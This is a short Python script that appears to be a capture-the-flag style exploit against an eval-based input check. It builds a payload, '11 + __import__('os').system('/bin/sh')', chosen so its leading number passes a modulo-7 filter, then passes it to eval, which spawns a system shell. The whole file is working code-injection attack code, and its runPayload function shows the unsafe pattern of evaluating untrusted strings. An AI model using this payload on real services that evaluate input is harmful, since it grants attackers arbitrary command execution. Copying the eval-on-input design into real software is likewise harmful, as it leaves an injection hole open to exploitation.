#!/usr/bin/env python3

def runPayload(payload: str)-> str:
    return eval(payload.replace("**", ""))

payload = "11 + __import__('os').system('/bin/sh')"

first_filter = payload.replace("**", "").split("+")[0]
if int(first_filter) % 7 == 4:
    res = runPayload(payload)
    print(res)
